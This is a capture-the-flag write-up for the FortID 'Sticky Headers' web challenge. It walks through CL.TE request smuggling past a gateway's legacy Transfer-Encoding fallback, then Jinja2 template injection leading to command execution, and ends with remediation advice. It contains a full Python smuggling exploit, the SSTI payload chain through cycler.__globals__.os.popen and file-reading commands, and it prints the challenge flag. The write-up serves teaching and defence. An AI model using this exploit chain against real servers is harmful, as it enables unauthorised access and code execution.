Sticky Headers — HTTP Request Smuggling via Legacy Compatibility Fallback Leading to SSTI RCE | FortID CTF

A. Title and Metadata
Field	Value
Challenge Name	Sticky Headers
Platform	FortID CTF (inst6.ctf.fortid.com)
Category	Web
Difficulty	Medium–Hard (estimated)
Flag Format	FortID{...}
Date	October 9–10, 2026
Author	isit

B. Executive Summary
The Sticky Headers challenge exposed a delivery gateway (proxy.py) fronting an internal staff template preview service (staff.py). The gateway enforced a block on /staff/preview but implemented a legacy compatibility mode for clients identifying as X-Client-Version: 1. In this mode, when multiple Transfer-Encoding values were present, the gateway incorrectly fell back to Content-Length for request framing while still forwarding the trailing bytes verbatim. This created a classic CL.TE request smuggling desynchronization: the gateway treated the smuggled request as body data, while the backend Python BaseHTTPRequestHandler honored Transfer-Encoding: chunked and split the stream into two distinct requests. The smuggled POST /staff/preview reached the backend, which rendered the user-supplied message parameter directly through Jinja2's Template.render() without sandboxing, yielding server-side template injection (SSTI) and arbitrary command execution. The secret recipe (recipe.txt) was recovered from /opt/candy/recipe.txt and /tmp/recipe.txt.


C. Challenge Overview
Original Description

The Sticky Sweets ordering service is protected by a delivery gateway. The public shop is available to everyone, but the staff template preview is meant to remain private. 🍬

The gateway supports an older courier protocol for compatibility. Somewhere in the staff workflow, a secret recipe is waiting to be recovered.

Legend says that whoever steals the recipe will become famous, rich, and the unofficial ruler of every candy shop in town. The current owner claims this is "completely ridiculous" while nervously guarding the staff portal.

Can you find the recipe before the next delivery leaves?

The recipe is stored in a file named recipe.txt somewhere on the staff system.

Connection: ncat --ssl sticky-headers-5a343490e648.inst6.ctf.fortid.com 1337

Flags use the format FortID{...}
Objective: Retrieve recipe.txt from the staff system by bypassing the gateway's access control.
Scope: Single HTTPS endpoint on port 1337 (TLS 1.3, ALPN h2/http/1.1). No authentication, no client certificates.


<img width="1107" height="652" alt="image" src="https://github.com/user-attachments/assets/2a8dec6c-bf98-4209-ae26-2122bc967170" />


D. Environment and Tools
Tool	Version	Purpose
openssl s_client / ncat --ssl	System (OpenSSL 3.0.13)	TLS connection to challenge endpoint
curl	8.5.0	HTTP/1.1 and HTTP/2 probing, header manipulation
Python 3	3.12+	Custom smuggling/exploitation scripts, urllib.parse for encoding
ssl / socket modules	Standard library	Raw TLS socket communication for precise header control
jinja2	Identified via source	Template engine confirmation (not directly used)
No external frameworks (Burp, sqlmap, etc.) were required. All exploitation used raw TLS sockets to control header ordering, whitespace, and duplication exactly.


E. Methodology and Reconnaissance
1. Service Discovery and Baseline Behavior
Objective: Identify accessible endpoints and understand the gateway's routing logic.
Action:
# TLS connection, GET root
openssl s_client -connect sticky-headers-5a343490e648.inst6.ctf.fortid.com:1337 -quiet << 'EOF'
GET / HTTP/1.1
Host: x

EOF
Evidence: Root returns a candy-order form (200 OK, Content-Length: 2092). The page references:
- POST /order with X-Client-Version: 2 (current couriers)
- Note: "Older couriers may describe delivery contents using more than one encoding."
Interpretation: The frontend is a shop (/order). A legacy code path (X-Client-Version: 1) exists. The hint about "more than one encoding" suggests Transfer-Encoding parsing differences.
Next Step: Enumerate hidden endpoints via robots.txt and brute-force common paths.


2. Hidden Endpoint Discovery
Objective: Locate the staff portal referenced in the challenge description.
Action:
GET /robots.txt HTTP/1.1
Host: x
Evidence:
User-agent: *
# Staff preview accepts a form field named message.
Disallow: /staff/preview
Interpretation: /staff/preview exists but is disallowed for crawlers. The message form field hint confirms the parameter name.
Next Step: Test direct access to /staff/preview and probe the gateway's blocking logic.


3. Gateway Blocking Behavior
Objective: Determine how the gateway enforces the /staff/preview restriction.
Action: Various GET/POST to /staff/preview with different headers, methods, and path obfuscations.
Evidence:
- Direct GET/POST /staff/preview → 403 Forbidden, Content-Length: 10, no Connection header.
- All other endpoints (/, /order, /robots.txt) return Connection: keep-alive.
- Path variations (//staff/preview, /staff/preview/, /%73taff/preview, etc.) → 404 Not Found.
- Header overrides (X-Original-URL, X-Rewrite-URL, X-Forwarded-For, Referer, Host: localhost) → no bypass.
Interpretation: The gateway explicitly checks path == "/staff/preview" and returns a hardcoded 403 before forwarding. The missing Connection header indicates the response is generated by the gateway itself, not proxied from the backend. The backend is never reached for direct requests.
Next Step: Analyze the gateway's request parsing logic to find a desynchronization vector. The "older couriers" hint and X-Client-Version header are the primary leads.



4. Transfer-Encoding Parsing Analysis
Objective: Map how the gateway handles Transfer-Encoding headers, especially with X-Client-Version: 1.
Action: Systematic testing of TE header variations with Content-Length: 100 and a short chunked body (5\r\nhello\r\n0\r\n\r\n), measuring whether the gateway waits (uses CL) or responds immediately (uses TE).
Evidence (summary):
TE Header	X-Client-Version: 1	X-Client-Version: 2 / none
chunked	200 OK (uses TE)	200 OK (uses TE)
gzip, chunked	NO RESPONSE (waits for CL)	200 OK (uses TE)
chunked, gzip	NO RESPONSE	200 OK
chunked, chunked	NO RESPONSE	200 OK
identity, chunked	NO RESPONSE	200 OK
gzip	NO RESPONSE	NO RESPONSE
Interpretation: With X-Client-Version: 1 and multiple encodings containing chunked, the gateway ignores Transfer-Encoding and uses Content-Length. With X-Client-Version: 2 (or absent), it correctly parses the first chunked in the list. This is the compatibility fallback described in the challenge.
Next Step: Verify the fallback logic by reading the gateway source (later confirmed via RCE) and construct a CL.TE smuggling payload.




5. Gateway Source Confirmation (Post-Exploitation)
Objective: Confirm the exact vulnerable code path.
Action: After achieving RCE via SSTI, read /challenge/src/proxy.py.
Evidence (excerpt):
legacy_checkout = (
    method == "POST"
    and path == "/order"
    and parsed_headers.get(b"x-client-version") == b"1"
)
transfer_encoding = parsed_headers.get(b"transfer-encoding", b"")
encodings = [item.strip() for item in transfer_encoding.split(b",")]
compatibility_fallback = legacy_checkout and transfer_encoding != b"chunked"

if b"chunked" in encodings and not compatibility_fallback:
    # read until 0\r\n\r\n (TE framing)
else:
    length = int(parsed_headers.get(b"content-length", b"0"))

request = headers
while len(request) - header_end < length:
    chunk = self.request.recv(4096)
    request += chunk

backend.sendall(request[:header_end + length])
if compatibility_fallback:
    backend.sendall(request[header_end + length:])  # <-- smuggled bytes forwarded
Interpretation: When compatibility_fallback is true (v1 + multi-encoding), the gateway:
1. Uses Content-Length to determine how many bytes belong to the first request.
2. Forwards exactly header_end + length bytes to the backend.
3. Appends any remaining bytes (request[header_end + length:]) to the backend connection.
The backend (BaseHTTPRequestHandler) sees a single TCP stream containing two HTTP requests and processes both because it honors Transfer-Encoding: chunked in the first request.


F. Vulnerability Analysis
1. Request Smuggling (CL.TE Desynchronization)
Aspect	Detail
Component	Gateway (proxy.py) — ProxyHandler.handle()
Root Cause	compatibility_fallback logic uses Content-Length for framing when X-Client-Version: 1 and multiple Transfer-Encoding values are present, but still forwards trailing bytes.
Trust Boundary	Gateway → Backend (internal HTTP). The gateway assumes it fully controls request boundaries; the backend independently parses the stream.
Prerequisites	- POST /order<br>- X-Client-Version: 1<br>- Transfer-Encoding header with multiple values including chunked (e.g., gzip, chunked)<br>- Content-Length set to the length of the first request's body only
Impact	Bypass of gateway path-based access control (/staff/preview block). Arbitrary request smuggling to backend.


2. Server-Side Template Injection (SSTI) → RCE
Aspect	Detail
Component	Backend staff service (staff.py) — StaffHandler.do_POST()
Root Cause	User-controlled message parameter passed directly to jinja2.Template(message).render() without sandboxing or autoescaping.
Trust Boundary	HTTP request body → Template engine execution context.
Prerequisites	Ability to send POST /staff/preview with message parameter (achieved via smuggling).
Impact	Arbitrary Python code execution as the ctf user (uid=1000). Full filesystem read access within container.




G. Exploitation Walkthrough
Step 1: Craft the Smuggling Payload
Purpose: Send a POST /order that the gateway frames via Content-Length, but the backend splits via Transfer-Encoding: chunked, delivering a smuggled POST /staff/preview.
Payload Structure:
POST /order HTTP/1.1
Host: x
Content-Length: <LEN>
Transfer-Encoding: gzip, chunked
X-Client-Version: 1

0\r\n\r\n
POST /staff/preview HTTP/1.1
Host: x
Content-Type: application/x-www-form-urlencoded
Content-Length: <MSG_LEN>

message=<PAYLOAD>
- First request body: 0\r\n\r\n (valid chunked terminator, zero-length body).
- Content-Length = length of 0\r\n\r\n + smuggled request.
- Gateway reads exactly Content-Length bytes, forwards them, then forwards the smuggled request as trailing bytes.
- Backend sees two requests: (1) POST /order with chunked body ending at 0\r\n\r\n, (2) POST /staff/preview.
Python Snippet (exact exploit used):
import socket, ssl
from urllib.parse import quote_plus

HOST = "sticky-headers-5a343490e648.inst6.ctf.fortid.com"
PORT = 1337

def smuggle(message: str) -> str:
    # Inner smuggled request to staff preview
    inner_body = f"message={quote_plus(message)}".encode()
    smuggled = (
        b"POST /staff/preview HTTP/1.1\r\n"
        b"Host: x\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: " + str(len(inner_body)).encode() + b"\r\n"
        b"\r\n" + inner_body
    )

    # Outer request body: chunked terminator + smuggled request
    outer_body = b"0\r\n\r\n" + smuggled
    outer_cl = len(outer_body)

    poison = (
        b"POST /order HTTP/1.1\r\n"
        b"Host: x\r\n"
        b"Content-Length: " + str(outer_cl).encode() + b"\r\n"
        b"Transfer-Encoding: gzip, chunked\r\n"
        b"X-Client-Version: 1\r\n"
        b"\r\n" + outer_body
    )

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=HOST) as ss:
            ss.settimeout(5)
            ss.sendall(poison)
            data = b""
            while True:
                try:
                    chunk = ss.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                except socket.timeout:
                    break
    return data.decode(errors="replace")

# Test SSTI
print(smuggle("{{7*7}}"))  # -> "49" in preview div
Evidence (truncated response):
HTTP/1.1 200 OK          # Gateway response for /order
Content-Length: 443
... Order received ...

HTTP/1.0 200 OK          # Backend response for smuggled /staff/preview
Server: BaseHTTP/0.6 Python/3.12.15
Content-Type: text/html; charset=utf-8
Content-Length: 743

... <div class="preview">49</div> ...
Interpretation: Two HTTP responses on one connection confirm successful desynchronization. The second response contains the rendered template output (49 from {{7*7}}), proving SSTI.


Step 2: Achieve Command Execution
Purpose: Leverage Jinja2's access to Python built-ins via cycler.__init__.__globals__.os.
Payload:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
Evidence (preview div):
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
Interpretation: Full command execution as the ctf user. The container filesystem is accessible.



Step 3: Locate and Read recipe.txt
Purpose: Find the flag file.
Commands Executed via SSTI:
# Find recipe.txt
{{ cycler.__init__.__globals__.os.popen('find / -name recipe.txt 2>&1 | head -n 20').read() }}

# Read both candidates
{{ cycler.__init__.__globals__.os.popen('cat /opt/candy/recipe.txt').read() }}
{{ cycler.__init__.__globals__.os.popen('cat /tmp/recipe.txt').read() }}
Evidence:
/opt/candy/recipe.txt
/tmp/recipe.txt
Both files contain:
FortID{1_C4NT_5H4K3_TH15_H34D3R_6fbfebc697}


H. Initial Access and Post-Exploitation
The challenge did not require a persistent shell or lateral movement. The SSTI provided direct command execution sufficient to read the target file. No privilege escalation was needed or attempted; the ctf user had read access to both flag locations.


I. Flag Retrieval and Verification
Flag: FortID{1_C4NT_5H4K3_TH15_H34D3R_6fbfebc697}
Verification: Identical content retrieved from two independent filesystem locations (/opt/candy/recipe.txt and /tmp/recipe.txt) via separate command executions, confirming authenticity.


J. Root Cause and Remediation
1. Gateway Request Smuggling
Issue	Remediation
Inconsistent framing logic — Gateway uses CL for legacy clients but TE for modern ones on the same endpoint.	Normalize framing: always use one method per endpoint, or reject ambiguous requests (RFC 9112 §6.3).
Forwarding trailing bytes — compatibility_fallback appends unparsed bytes to backend connection.	Never forward bytes beyond the declared framing length. Close or reset the backend connection after the framed request.
Header-based version switching — X-Client-Version alters parsing behavior.	Avoid version-dependent parsing. If legacy support is required, terminate TLS at a dedicated legacy endpoint with its own strict parser.
Missing request validation — Gateway does not verify that the forwarded request matches the parsed structure.	Implement a strict HTTP parser (e.g., httptools, http_parser) that rejects malformed or ambiguous requests before forwarding.

2. SSTI in Staff Preview
Issue	Remediation
Direct template rendering of user input — Template(message).render() with no sandbox.	Use a sandboxed environment (jinja2.sandbox.SandboxedEnvironment) or, preferably, avoid template rendering of untrusted input entirely.
Exposure of dangerous globals — cycler, namespace, joiner provide paths to __globals__ → os.	Enable SandboxedEnvironment with a restricted globals dict. Disable access to __init__, __globals__, __class__, subprocess, os, sys.
No input validation — message parameter accepted without sanitization.	Validate message against an allowlist of safe characters or a predefined template set.

Production vs. CTF Context: The challenge intentionally combined these weaknesses. In production, either flaw alone is critical; together they enable a complete bypass of network- and application-layer controls.



K. CVE and Vulnerability References
No specific CVE directly matches this challenge. The vulnerabilities are instances of well-known classes:
Class	Reference
HTTP Request Smuggling (CL.TE)	PortSwigger: HTTP Request Smuggling (https://portswigger.net/web-security/request-smuggling) — "CL.TE: the front-end uses Content-Length, the back-end uses Transfer-Encoding"
Transfer-Encoding Parsing Ambiguity	RFC 9112 §6.3 (https://www.rfc-editor.org/rfc/rfc9112.html#section-6.3) — "A server that receives a request with a Transfer-Encoding header field MUST NOT also use Content-Length"
Jinja2 SSTI → RCE	PayloadsAllTheThings: SSTI (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) — Jinja2 cycler.__init__.__globals__.os chain
Python BaseHTTPRequestHandler Request Parsing	Python Docs: http.server (https://docs.python.org/3/library/http.server.html) — Handles multiple requests per connection when Transfer-Encoding: chunked is present



L. Lessons Learned
1. Legacy compatibility code is a frequent source of parsing differentials. The X-Client-Version: 1 fallback was a deliberate "older courier protocol" feature; in real systems, such versioned parsing paths often receive less scrutiny.
2. Request smuggling does not require a front-end proxy like Nginx or HAProxy. Any component that makes framing decisions (CL vs TE) and forwards raw bytes can be desynchronized. A custom Python ThreadingTCPServer is sufficient.
3. Header-based feature flags that alter protocol parsing are dangerous. X-Client-Version changed the gateway's framing logic without changing the backend's. This asymmetry is the root enabler.
4. SSTI in Jinja2 is trivially escalated to RCE when the template context includes cycler, namespace, or joiner (all default). Sandboxing is not optional for user-supplied templates.
5. Evidence-driven iteration beats tool reliance. The vulnerability was found by manually testing Transfer-Encoding variations against X-Client-Version values and observing timing/response differences — not by running an automated scanner.


M. References
- RFC 9112 — HTTP Semantics, Section 6.3 (Transfer-Encoding and Content-Length)
- PortSwigger Research — HTTP Request Smuggling (CL.TE, TE.CL, TE.TE variants)
- Jinja2 Documentation — SandboxedEnvironment, Autoescaping, Template Injection
- PayloadsAllTheThings — Server-Side Template Injection (Jinja2 payloads)
- Python http.server Source — BaseRequestHandler request parsing behavior
- FortID CTF Platform — Challenge infrastructure and flag format











